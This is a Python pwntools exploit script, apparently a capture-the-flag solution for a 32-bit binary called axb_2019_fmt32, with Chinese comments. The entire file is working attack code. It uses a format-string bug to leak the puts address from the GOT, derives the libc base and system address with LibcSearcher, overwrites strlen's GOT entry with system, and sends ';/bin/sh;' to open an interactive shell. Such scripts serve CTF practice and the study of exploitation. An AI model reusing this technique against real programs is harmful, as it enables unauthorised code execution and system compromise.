from pwn import *
from LibcSearcher import *

context.arch = 'i386'
elf = ELF('./axb_2019_fmt32')
p = process(['./axb_2019_fmt32'])


def exec_fmt(payload):
    p.recvuntil('me:')
    p.send(payload)
    return p.recvline()


# 自动计算偏移
p.recvuntil('say!\n')
auto_fmt = FmtStr(execute_fmt=exec_fmt, numbwritten=9)

# 泄露puts地址计算system地址
puts_address = unpack(exec_fmt(b'A' + pack(elf.got['puts']) + f'%{auto_fmt.offset}$s'.encode())[14:18])
libc = LibcSearcher('puts', puts_address)
libc_base = puts_address - libc.dump('puts')
system_address = libc_base + libc.dump('system')

# 改写GOT表
auto_fmt.write(elf.got['strlen'], system_address)
auto_fmt.execute_writes()

# strlen('Repeater:;/bin/sh;\n') -> system('Repeater:;/bin/sh;\n')
p.recvuntil('me:')
p.sendline(';/bin/sh;')
p.interactive()
